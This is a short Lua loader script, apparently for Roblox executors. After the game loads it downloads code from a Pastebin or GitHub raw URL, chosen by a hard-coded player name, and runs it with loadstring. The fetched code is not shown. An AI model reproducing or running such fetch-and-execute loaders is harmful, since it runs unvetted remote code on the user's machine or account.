repeat  task.wait() until game:IsLoaded()

if game:GetService('Players').LocalPlayer.Name == "rel_baldskix" then
	loadstring(game:HttpGet("https://pastebin.com/raw/AtpMtN4s",true))()
	return;
else
	loadstring(game:HttpGet("https://raw.githubusercontent.com/relbaldski/bald/main/livebuild.lua",true))()
end
